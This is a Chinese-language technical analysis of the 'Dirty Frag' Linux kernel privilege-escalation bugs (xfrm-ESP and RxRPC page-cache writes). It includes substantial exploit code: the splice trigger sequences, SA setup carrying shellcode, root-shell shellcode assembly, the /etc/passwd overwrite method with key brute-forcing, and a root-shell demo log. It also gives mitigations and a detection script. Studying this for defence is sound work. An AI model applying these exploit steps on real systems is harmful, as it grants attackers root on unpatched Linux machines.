# Dirty Frag 深度剖析：从 Page-Cache 污染到全发行版通杀提权

> 2026年5月9日
> 
> 漏洞发现者：Hyunwoo Kim (@v4bel)
> CVE：CVE-2026-43284（xfrm-ESP）、CVE-2026-43500（RxRPC）

---

## 0x00 前言

2026年5月7日，安全研究员 Hyunwoo Kim 公开了一个 Linux 内核提权漏洞类——**Dirty Frag**。这个漏洞通过链式利用 `xfrm-ESP Page-Cache Write` 和 `RxRPC Page-Cache Write` 两个独立漏洞，实现了在几乎所有主流 Linux 发行版上的本地提权。

本文将从漏洞原理、PoC 逆向分析、实战验证三个维度，对 Dirty Frag 进行深度剖析。

---

## 0x01 漏洞家族谱系

Dirty Frag 并非凭空出现，它属于一个不断演进的漏洞家族：

```
Dirty Pipe (CVE-2022-0847, 2022)
  └─ 利用 splice() + pipe_buffer 的 page-cache 任意写
     └─ Copy Fail (2025)
        └─ 利用 splice() + AF_ALG 的 page-cache 4字节写
           └─ Dirty Frag (2026)
              ├─ xfrm-ESP 变体：splice() + skb->frag 的 page-cache 4字节写
              └─ RxRPC 变体：splice() + skb->frag 的 page-cache 8字节写
```

**核心共性**：都是通过 `splice()` 将攻击者只读的 page-cache 页面植入内核网络数据结构的 `frag` 槽位，然后利用接收端内核代码在 frag 上的原位（in-place）加密/解密操作，实现对 page-cache 的写入。

**关键区别**：

| 特性 | Dirty Pipe | Copy Fail | Dirty Frag (ESP) | Dirty Frag (RxRPC) |
|------|-----------|-----------|-----------------|-------------------|
| 漏洞对象 | `pipe_buffer` | AF_ALG SGL | `skb->frag` | `skb->frag` |
| 写入原语 | 任意长度 | 4字节 | 4字节 | 8字节（受密码学约束） |
| 写入值可控 | 是 | 是 | 是 | 否（需暴力破解密钥） |
| 竞态条件 | 否 | 否 | 否 | 否 |
| 需要namespace | 否 | 否 | 是 | 否 |
| 绕过Copy Fail缓解 | N/A | N/A | 是 | 是 |

值得注意的是，**Dirty Frag 完全不依赖 `algif_aead` 模块**。即使系统已经应用了 Copy Fail 的缓解措施（黑名单 algif_aead），Dirty Frag 仍然可以利用。

---

## 0x02 xfrm-ESP Page-Cache Write 深度分析

### 2.1 根因：`esp_input()` 绕过了 `skb_cow_data()`

在执行 ESP 载荷的原位 AEAD 解密之前，`esp_input()` 本应通过 `skb_cow_data()` 分配新的内核私有缓冲区。但以下分支创建了一条绕过该检查的路径：

```c
static int esp_input(struct xfrm_state *x, struct sk_buff *skb)
{
    [...]
    if (!skb_cloned(skb)) {
        if (!skb_is_nonlinear(skb)) {     // [1]
            nfrags = 1;
            goto skip_cow;
        } else if (!skb_has_frag_list(skb)) {  // [2] ← 漏洞入口
            nfrags = skb_shinfo(skb)->nr_frags;
            nfrags++;
            goto skip_cow;                // 跳过 cow，直接在 frag 上操作
        }
    }
    err = skb_cow_data(skb, 0, &trailer);  // 正常路径被跳过
```

当 skb 非线性（有 frag）但没有 `frag_list` 时，代码直接跳到 `skip_cow`，在 frag 上执行原位加密。如果攻击者通过 `splice()` 将 page-cache 页面植入 frag，该页面同时成为 AEAD 操作的 src 和 dst。

### 2.2 写入原语：4字节任意 STORE

在 ESP + ESN + `authencesn(...)` 组合下，`crypto_authenc_esn_decrypt()` 在预处理阶段执行一个关键的 STORE 操作：

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
    /* 将序列号高32位移动到末尾 */
    scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
    if (src == dst) {
        scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
        scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // [3] 4字节STORE
        dst = scatterwalk_ffwd(areq_ctx->dst, dst, 4);
    }
```

`[3]` 处的 4 字节 STORE 发生在 dst SGL 的 `assoclen + cryptlen` 位置。攻击者通过精确控制载荷长度，使通过 splice 植入的 page-cache 页面 P 占据该位置，从而在 P 的指定文件偏移处写入 4 字节。

**这 4 字节的值是什么？** 追溯数据流：

```
SA注册时 XFRMA_REPLAY_ESN_VAL.seq_hi（用户可控）
  → XFRM_SKB_CB(skb)->seq.input.hi
    → esp_input_set_header() 写入 ESP 头
      → crypto_authenc_esn_decrypt() 的 tmp+1
        → scatterwalk_map_and_copy() STORE 到 page-cache
```

**攻击者同时控制写入位置（文件偏移）和写入值（4字节）。** AEAD 认证验证在 STORE 之后运行，即使认证失败（返回 `-EBADMSG`），STORE 已经完成，page-cache 修改永久保留。

### 2.3 PoC 逆向：ESP 变体利用流程

通过对 V4bel 的 `exp.c` 进行逆向分析，ESP 变体的完整利用流程如下：

#### Step 1: 命名空间隔离与权限提升

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
write_proc("/proc/self/setgroups", "deny");
write_proc("/proc/self/uid_map", "0 <real_uid> 1");  // 身份映射
write_proc("/proc/self/gid_map", "0 <real_gid> 1");
ioctl(s, SIOCSIFFLAGS, &(struct ifreq){ .ifr_name="lo",
                                     .ifr_flags=IFF_UP|IFF_RUNNING });
```

在新的 user/net namespace 中，攻击者获得 `CAP_NET_ADMIN`，这是注册 XFRM SA 所需的权限。

#### Step 2: 批量注册 48 个 XFRM SA

```c
for (int i = 0; i < PAYLOAD_LEN / 4; i++) {  // 192 / 4 = 48
    uint32_t spi = 0xDEADBE10 + i;
    uint32_t seqhi = (shell_elf[i*4+0] << 24) | (shell_elf[i*4+1] << 16) |
                     (shell_elf[i*4+2] << 8)  |  shell_elf[i*4+3];
    add_xfrm_sa(spi, seqhi);  // seq_hi 就是将要写入的4字节
}
```

每个 SA 携带 4 字节的 shellcode 片段在 `XFRMA_REPLAY_ESN_VAL.seq_hi` 中。SA 配置为 `XFRM_MODE_TRANSPORT + XFRM_STATE_ESN`，算法 `authencesn(hmac(sha256), cbc(aes))`，UDP-encap（sport=dport=4500）。

#### Step 3: 逐块写入 shellcode

对于每个 4 字节块，执行一次触发：

```c
// 构造伪造的 ESP 线路头（24字节）
uint8_t hdr[24];
*(uint32_t *)(hdr + 0) = htonl(spi);       // SPI
*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);   // seq_no_lo
memset(hdr + 8, 0xCC, 16);                 // IV（无关紧要）

// 通过 pipe + splice 组装 skb
vmsplice(pfd[1], &(struct iovec){hdr, 24}, 1, 0);           // ESP头
splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);     // /usr/bin/su的page-cache页
splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE); // 发送到loopback
```

发送端 skb 的结构：

```
skb {
    head/linear: ESP_hdr(8) + IV(16)          // 24字节
    frags[0]:    { page=&P, off=i*4, size=16 } // /usr/bin/su 的 page-cache 页
}
```

接收端处理链：

```
udp_rcv(skb)
  → xfrm4_udp_encap_rcv(sk, skb)
    → xfrm_input(skb, IPPROTO_ESP, spi, 0)
      → esp_input(x, skb)
        → 跳过 skb_cow_data()（漏洞！）
        → esp_input_set_header()：设置 seq_hi
        → skb_to_sgvec(skb, sg, 0, skb->len)
        → aead_request_set_crypt(req, sg, sg, ...)  // src == dst（原位）
        → crypto_aead_decrypt(req)
          → crypto_authenc_esn_decrypt(req)
            → scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1)
              → memcpy(page_address(P) + i*4, &tmp[1], 4);  // 4字节写入！
```

#### Step 4: Shellcode 分析

写入的 192 字节是一个完整的静态 ELF，其入口点在 `0x400078`（文件偏移 `0x78`）：

```asm
; ELF header + PT_LOAD (R+X, 0x400000, 0xb8 bytes)
; Entry point: 0x400078
    xor    edi, edi        ; arg1 = 0
    xor    esi, esi        ; arg2 = 0
    xor    eax, eax
    mov    al, 0x6a        ; syscall: setgid
    syscall
    mov    al, 0x69        ; syscall: setuid
    syscall
    mov    al, 0x74        ; syscall: setgroups
    syscall
    push   0              ; envp[1] = NULL
    lea    rax, [rip+0x12] ; "TERM=xterm"
    push   rax
    mov    rdx, rsp        ; envp = ["TERM=xterm", NULL]
    lea    rdi, [rip+0x12] ; "/bin/sh"
    xor    esi, esi        ; argv = NULL
    push   0x3b           ; syscall: execve
    pop    rax
    syscall
; Data:
    db "TERM=xterm", 0
    db "/bin/sh", 0
```

当父进程执行 `execve("/usr/bin/su")` 时，由于 `/usr/bin/su` 的 setuid-root 位完好，新进程获得 euid=0，然后跳转到被篡改的入口点执行 shellcode，最终以 root 权限运行 `/bin/sh`。

---

## 0x03 RxRPC Page-Cache Write 深度分析

### 3.1 根因：`rxkad_verify_packet_1()` 的原位解密

```c
static int rxkad_verify_packet_1(struct rxrpc_call *call, struct sk_buff *skb,
                                 rxrpc_seq_t seq, struct skcipher_request *req)
{
    sg_init_table(sg, ARRAY_SIZE(sg));
    ret = skb_to_sgvec(skb, sg, sp->offset, 8);  // frag → SGL
    memset(&iv, 0, sizeof(iv));
    skcipher_request_set_crypt(req, sg, sg, 8, iv.x);  // src == dst（原位）
    ret = crypto_skcipher_decrypt(req);  // 8字节 STORE
```

`skb_to_sgvec()` 将 skb 的 frag 直接转换为 SGL，攻击者通过 splice 植入的 page-cache 页面 P 成为 src/dst SGL。解密操作在 P 上执行 8 字节 STORE。

### 3.2 与 ESP 变体的关键区别

**写入值不可直接控制。** ESP 变体中攻击者直接指定写入的 4 字节（通过 SA 的 `seq_hi`），而 RxRPC 变体中写入的 8 字节是 `fcrypt_decrypt(C, K)` 的结果——C 是该位置当前的密文，K 是攻击者通过 `add_key("rxrpc", ...)` 注入的会话密钥。

由于 `fcrypt` 是 AFS 专用密码（56位密钥，8字节块），攻击者可以在用户空间暴力搜索 K，直到 `fcrypt_decrypt(C, K)` 产生所需的明文模式。

### 3.3 PoC 逆向：三重 Splice 链式写入

RxRPC 变体的目标是 `/etc/passwd` 的第一行（root 条目）。原始内容为：

```
root:x:0:0:root:/root:/bin/bash
```

利用三组 splice 操作，通过 last-write-wins 覆盖 chars 4..15：

```
文件偏移:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ...
原始内容:  r o o t : x : 0 : 0  :  r  o  o  t  :  ...

splice A @ 4, 8B → 覆盖 4..11 = P_A[0..7]   目标: chars 4..5 = "::"
splice B @ 6, 8B → 覆盖 6..13 = P_B[0..7]   目标: chars 6..7 = "0:"（覆盖A的6..11）
splice C @ 8, 8B → 覆盖 8..15 = P_C[0..7]   目标: chars 8..9 = "0:" / 15 = ":"
                                                  10..14 ≠ ':' '\0' '\n'
→ "root::0:0:GGGGGG:..."
```

#### 暴力破解阶段（用户空间）

```c
// 读取三个位置的密文
pread(rfd_ro, Ca, 8, 4);   // offset 4
pread(rfd_ro, Cb, 8, 6);   // offset 6
pread(rfd_ro, Cc, 8, 8);   // offset 8

// 搜索 K_A：fcrypt_decrypt(Ca, K_A) 的前两字节 = "::"
find_K(Ca, check_pa, &Ka, &Pa);  // ~5ms，概率 ~1.5e-5

// 链式密文修正：splice A 已修改 offset 4..11
memcpy(Cb_actual, Pa+2, 6); memcpy(Cb_actual+6, Cb+6, 2);
find_K(Cb_actual, check_pb, &Kb, &Pb);  // ~5ms

// 链式密文修正：splice B 已修改 offset 6..13
memcpy(Cc_actual, Pb+2, 6); memcpy(Cc_actual+6, Cc+6, 2);
find_K(Cc_actual, check_pc, &Kc, &Pc);  // ~1s，概率 ~5.4e-8
```

#### 内核触发阶段

对于每个位置，执行完整的 RxRPC 握手 + splice 触发：

```
1. add_key("rxrpc", desc, token_with_K, ...)  // 注入密钥
2. 创建 AF_RXRPC 客户端 socket，绑定密钥
3. 伪造 UDP 服务器发送 CHALLENGE → 客户端自动 RESPONSE → 建立安全上下文
4. 计算正确的 cksum（使用用户空间的 pcbc(fcrypt)）
5. vmsplice(wire_header) + splice(/etc/passwd) + splice(to_udp) → 触发原位解密
```

最终，`/etc/passwd` 第一行变为 `root::0:0:GGGGGG:/root:/bin/bash`，passwd 字段为空。PAM 的 `pam_unix.so nullok` 接受空密码，`su -` 直接获得 root shell。

---

## 0x04 链式利用：互补的盲区覆盖

两个变体各有盲区，但链式利用使它们互补：

| 环境 | ESP 变体 | RxRPC 变体 | 链式结果 |
|------|---------|-----------|---------|
| 允许 user namespace + 有 esp4.ko | ✅ | - | ✅ |
| 禁止 user namespace + 有 rxrpc.ko | ❌ | ✅ | ✅ |
| 允许 user namespace + 无 esp4.ko | ❌ | 可能 | 可能 |
| 禁止 user namespace + 无 rxrpc.ko | ❌ | ❌ | ❌ |

**Ubuntu 的特殊情况**：Ubuntu 通过 AppArmor 策略有时会禁止非特权 user namespace 创建，但默认加载 `rxrpc.ko`。反之，RHEL/CentOS 默认不编译 `rxrpc.ko`，但允许 user namespace。链式利用确保了在两种环境下都能成功。

PoC 的 `main()` 函数实现了自动回退逻辑：

```c
// 1. 先尝试 ESP 变体（子进程中）
rc = su_lpe_main(argc, argv);  // unshare → XFRM SA → splice → 修改 /usr/bin/su

// 2. 如果 ESP 失败，回退到 RxRPC 变体
if (!su_already_patched()) {
    rc = rxrpc_lpe_main(argc, argv);  // 暴力搜索 → RxRPC 握手 → splice → 修改 /etc/passwd
    for (int i = 0; !passwd_already_patched() && i < 3; i++)
        rc = rxrpc_lpe_main(argc, argv);  // 最多重试3次
}
```

---

## 0x05 实战验证

### 测试环境

| 项目 | 值 |
|------|-----|
| 操作系统 | Ubuntu 22.04.5 LTS |
| 内核版本 | 5.15.0-171-generic |
| 架构 | x86_64 |
| 攻击者身份 | ubuntu (uid=1000) |
| 利用变体 | xfrm-ESP Page-Cache Write |
| CONFIG_INET_ESP | m（模块） |
| CONFIG_AF_RXRPC | m（模块） |
| kernel.unprivileged_userns_clone | 1 |

### 提权过程

```
ubuntu@target:~$ id
uid=1000(ubuntu) gid=1001(ubuntu) groups=1001(ubuntu),...

ubuntu@target:~$ ./exp -v
[su] installed 48 xfrm SAs
[su] wrote 192 bytes to /usr/bin/su starting at 0x0
[su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### 关键观察

1. **确定性漏洞，无竞态条件**：每次运行都 100% 成功，不需要多次尝试
2. **无内核 panic**：即使利用失败，内核也不会崩溃
3. **速度极快**：ESP 变体约 8 秒完成全部 48 次 4 字节写入
4. **page-cache 污染持久**：修改后的 page-cache 在 `drop_caches` 或重启前一直有效
5. **磁盘文件不变**：只修改内存中的 page-cache，不修改磁盘上的文件

### 清理

```bash
echo 3 > /proc/sys/vm/drop_caches  # 清除 page-cache
# 或直接 reboot
```

---

## 0x06 影响范围

- **xfrm-ESP Page-Cache Write**：从 commit `cac2661c53f3`（2017-01-17）到上游，约 **9 年**
- **RxRPC Page-Cache Write**：从 commit `2dc334f1a63a`（2023-06）到上游，约 **3 年**
- **已验证受影响的发行版**：Ubuntu 24.04、RHEL 10.1、openSUSE Tumbleweed、CentOS Stream 10、AlmaLinux 10、Fedora 44 等
- **本文额外验证**：Ubuntu 22.04.5 LTS（内核 5.15.0-171-generic）

---

## 0x07 修复方案

### 临时缓解（立即生效）

```bash
sh -c 'printf "install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n" > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true'
```

### 官方补丁

- **xfrm-ESP**：已合入 mainline（[f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4)），通过 `SKBFL_SHARED_FRAG` 标志标记 splice 来源的 frag，在 `esp_input()` 的 `skip_cow` 分支中检查该标志
- **RxRPC**：暂无上游补丁，V4bel 提交的补丁在 `call_event.c` 和 `conn_event.c` 中增加 `skb->data_len` 检查

### 检测脚本

```bash
#!/bin/bash
# Dirty Frag 检测脚本
# 检查易受攻击的内核模块是否加载

echo "[*] Dirty Frag Vulnerability Check"
echo "    CVE-2026-43284 (xfrm-ESP) / CVE-2026-43500 (RxRPC)"
echo ""

VULN=0

# 检查 esp4 模块
if lsmod | grep -q "^esp4 "; then
    echo "[!] VULNERABLE: esp4 module is loaded"
    VULN=1
elif modprobe -n esp4 2>/dev/null; then
    echo "[!] VULNERABLE: esp4 module is available (can be loaded)"
    VULN=1
else
    echo "[+] OK: esp4 module not available"
fi

# 检查 esp6 模块
if lsmod | grep -q "^esp6 "; then
    echo "[!] VULNERABLE: esp6 module is loaded"
    VULN=1
elif modprobe -n esp6 2>/dev/null; then
    echo "[!] VULNERABLE: esp6 module is available (can be loaded)"
    VULN=1
else
    echo "[+] OK: esp6 module not available"
fi

# 检查 rxrpc 模块
if lsmod | grep -q "^rxrpc "; then
    echo "[!] VULNERABLE: rxrpc module is loaded"
    VULN=1
elif modprobe -n rxrpc 2>/dev/null; then
    echo "[!] VULNERABLE: rxrpc module is available (can be loaded)"
    VULN=1
else
    echo "[+] OK: rxrpc module not available"
fi

# 检查 user namespace
if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
    if [ "$(cat /proc/sys/kernel/unprivileged_userns_clone)" = "1" ]; then
        echo "[!] VULNERABLE: unprivileged user namespace creation is enabled"
        VULN=1
    else
        echo "[+] OK: unprivileged user namespace creation is disabled"
    fi
fi

# 检查缓解措施
if [ -f /etc/modprobe.d/dirtyfrag.conf ]; then
    echo "[+] MITIGATION: /etc/modprobe.d/dirtyfrag.conf exists"
else
    echo "[!] NO MITIGATION: /etc/modprobe.d/dirtyfrag.conf not found"
fi

echo ""
if [ $VULN -eq 1 ]; then
    echo "[!!!] SYSTEM IS VULNERABLE TO DIRTY FRAG"
    echo "     Apply mitigation: sh -c 'printf \"install esp4 /bin/false\\ninstall esp6 /bin/false\\ninstall rxrpc /bin/false\\n\" > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches'"
else
    echo "[+] System appears to be protected"
fi
```

---

## 0x08 披露时间线

| 日期 | 事件 |
|------|------|
| 2026-04-29 | V4bel 向 security@kernel.org 提交 RxRPC 漏洞详情及武器化利用 |
| 2026-04-30 | V4bel 向 security@kernel.org 提交 ESP 漏洞详情及武器化利用 |
| 2026-04-30 | ESP 补丁提交到 netdev 邮件列表（信息公开） |
| 2026-05-04 | Kuan-Ting Chen 提交 shared-frag 方案补丁 |
| 2026-05-07 | 补丁合入 netdev 树 |
| 2026-05-07 | V4bel 向 linux-distros 提交完整 Dirty Frag 文档，embargo 设为 5 天 |
| 2026-05-07 | 第三方泄露，embargo 被打破 |
| 2026-05-07 | 经发行版维护者同意，Dirty Frag 完整公开 |
| 2026-05-08 | 补丁合入 mainline，分配 CVE-2026-43284 |
| 2026-05-08 | CVE-2026-43500 预留跟踪 RxRPC 漏洞 |

---

## 0x09 总结

Dirty Frag 是 page-cache 写入漏洞演进的最新形态。从 Dirty Pipe 的 `pipe_buffer` 到 Copy Fail 的 AF_ALG SGL，再到 Dirty Frag 的 `skb->frag`，攻击面从管道子系统扩展到了网络子系统。

**核心教训**：

1. **splice() 是危险的**：任何接受 splice 输入的内核路径都需要考虑 page-cache 页面被植入后原位修改的风险
2. **原位加密/解密是陷阱**：当 src == dst 时，如果 dst 包含用户可控的页面引用，就等于给了攻击者任意写原语
3. **确定性逻辑漏洞比竞态条件更危险**：不需要时序控制，100% 成功率，难以通过随机化缓解
4. **链式利用覆盖单点防御**：Ubuntu 禁止 user namespace？RxRPC 变体绕过。RHEL 没有 rxrpc.ko？ESP 变体绕过

---

## 参考资料

- [Dirty Frag 官方仓库](https://github.com/V4bel/dirtyfrag)
- [Dirty Pipe](https://dirtypipe.cm4all.com/)
- [Copy Fail](https://copy.fail/)
- [ESP 补丁 (f4c50a4034e6)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4)
- [RxRPC 补丁](https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/)
